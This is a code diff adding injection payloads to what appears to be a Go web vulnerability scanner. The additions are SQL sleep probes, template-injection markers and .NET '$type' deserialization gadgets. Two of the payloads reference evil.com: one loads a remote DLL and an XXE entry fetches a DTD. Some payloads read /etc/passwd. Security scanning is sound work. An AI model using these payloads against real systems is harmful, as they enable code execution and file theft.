@@ -43,6 +43,12 @@ func init() {
 			"'; DROP TABLE users; --",
 			"' UNION SELECT 1,2,3,4,5--",
 			"1; SELECT SLEEP(5)--",
+			// Short sleeps stay under the request timeout so the latency delta is
+			// observable by the time-based SQLi oracle (see checkInjectionOracle).
+			"1' AND SLEEP(2)-- -",
+			"1) AND SLEEP(2)-- -",
+			"1'; WAITFOR DELAY '0:0:2'-- -",
+			"1 AND pg_sleep(2)",
 			"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x716b6b71,0x41,0x7162627171,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
 			"' OR 1=1--",
 			"admin'--",
@@ -105,6 +111,13 @@ func init() {
 			"*{7*7}",
 			"@(7*7)",
 			"<%= 7*7 %>",
+			// Distinctive markers: the products (1787569 / 5557500) are highly
+			// improbable to appear by chance, so detecting them in a response is a
+			// low-false-positive signal that the expression was actually evaluated.
+			"{{1337*1337}}",
+			"${1337*1337}",
+			"#{2340*2375}",
+			"{{2340*2375}}",
 			"{{constructor.constructor('return this')()}}",
 		}},
 		{Name: "log4shell", Weight: 1.0, Payloads: []string{
@@ -125,6 +138,18 @@ func init() {
 		{Name: "xxe", Weight: 1.0, Payloads: []string{
 			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
 			`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`,
+		}},
+		// .NET insecure-deserialization gadgets. When a target uses Json.NET with
+		// TypeNameHandling != None (or BinaryFormatter / a permissive JsonSerializer),
+		// a `$type` directive can instantiate arbitrary types — a classic .NET RCE
+		// primitive. A 500 with a type-load / binder exception on these is a strong
+		// signal the endpoint honors `$type`.
+		{Name: "dotnet_deser", Weight: 1.4, Payloads: []string{
+			`{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`,
+			`{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a","Path":"http://evil.com/x.dll"}`,
+			`{"$type":"System.Collections.Generic.List` + "`" + `1[[System.Object]], mscorlib","$values":[]}`,
+			`{"$type":"System.IO.FileInfo, System.IO.FileSystem","fileName":"/etc/passwd","IsReadOnly":false}`,
+			`{"$type":"System.Data.Services.Internal.ExpandedWrapper` + "`" + `2[[System.String, mscorlib],[System.Windows.Markup.XamlReader, PresentationFramework]], System.Data.Services"}`,
 		}},
 		{Name: "unicode", Weight: 1.0, Payloads: []string{
 			"\xef\xbc\xae\xef\xbc\xaf\xef\xbc\xb2\xef\xbc\xad",
